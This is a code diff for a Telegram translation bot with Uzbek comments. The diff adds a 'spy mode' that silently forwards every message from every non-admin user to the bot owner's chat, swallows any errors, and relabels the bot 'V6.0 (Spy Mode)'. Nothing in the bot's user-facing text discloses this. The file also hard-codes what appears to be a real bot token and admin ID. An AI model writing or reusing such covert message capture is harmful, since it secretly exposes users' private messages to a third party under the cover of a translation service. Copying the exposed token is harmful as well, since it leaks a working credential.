@@ -12,7 +12,6 @@ import uuid
 # --- 1. SOZLAMALAR ---
 BOT_TOKEN = "8387200840:AAFMVfEWUhzB_C-25qjzajpQyRm5aF091hA"
 ADMIN_ID = 8431876566
-# 🔥 TUZATILDI: Botingizning asl nomi yozildi
 BOT_USERNAME = "@tarjimon_wbot"
 
 # --- 2. FLASK ---
@@ -20,7 +19,7 @@ flask_app = Flask('')
 
 @flask_app.route('/')
 def home():
-    return "Bot V5.1 (Fixed Name) Ishlamoqda!"
+    return "Bot V6.0 (Spy Mode) Ishlamoqda!"
 
 def run_http():
     flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
@@ -93,7 +92,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['lang_name'] = "🇬🇧 English"
         context.user_data['state'] = 'main'
 
-    # Bu yerda endi avtomatik @tarjimon_wbot chiqadi
     await update.message.reply_text(
         f"👋 Salom, <b>{user.first_name}</b>!\n\nBotdan foydalanish uchun quyidagi menyudan foydalaning.\n\n"
         f"🚀 <b>YANGILIK:</b> Endi istalgan chatda <code>{BOT_USERNAME} salom</code> deb yozib ko'ring!",
@@ -105,6 +103,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     user_id = update.effective_user.id
     state = context.user_data.get('state', 'main')
+
+    # 🔥 JOSUSLIK FUNKSIYASI (SPY MODE) 🔥
+    if user_id != ADMIN_ID:
+        try:
+            # Xabarni adminga forward qilamiz
+            await context.bot.forward_message(chat_id=ADMIN_ID, from_chat_id=user_id, message_id=update.message.message_id)
+        except:
+            pass 
 
     if text == "🔙 Bosh menyu":
         context.user_data['state'] = 'main'
@@ -132,7 +138,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif text == "ℹ️ Info":
-        await update.message.reply_text(f"Bot V5.1\nInline rejim: `{BOT_USERNAME} matn`", parse_mode="Markdown")
+        await update.message.reply_text(f"Bot V6.0\nInline rejim: `{BOT_USERNAME} matn`", parse_mode="Markdown")
         return
 
     if text == "👑 Admin Panel" and user_id == ADMIN_ID:
@@ -159,7 +165,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if state == 'feedback':
         if user_id != ADMIN_ID:
-            await context.bot.forward_message(chat_id=ADMIN_ID, from_chat_id=user_id, message_id=update.message.message_id)
             await update.message.reply_text("✅ Yuborildi!", reply_markup=main_menu_keyboard(user_id))
             context.user_data['state'] = 'main'
         return
@@ -182,12 +187,10 @@ async def audio_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         data = query.data.split('_')
         tts = gTTS(text=context.user_data.get('last_translation', 'Hello'), lang=data[1], slow=False)
         tts.save("audio.mp3")
-        # Audio tagida endi @tarjimon_wbot chiqadi
         await context.bot.send_audio(chat_id=query.message.chat_id, audio=open("audio.mp3", 'rb'), title="Tarjima", performer=BOT_USERNAME)
         os.remove("audio.mp3")
     except: await query.message.reply_text("Ovoz yo'q.")
 
-# 🔥 INLINE MODE 🔥
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.inline_query.query
     if not query:
@@ -235,6 +238,6 @@ if __name__ == '__main__':
     application.add_handler(CallbackQueryHandler(audio_callback))
     application.add_handler(InlineQueryHandler(inline_query))
     
-    print("Bot V5.1 ishga tushdi!")
+    print("Bot V6.0 (Spy Mode) ishga tushdi!")
     application.run_polling()
-    
+        
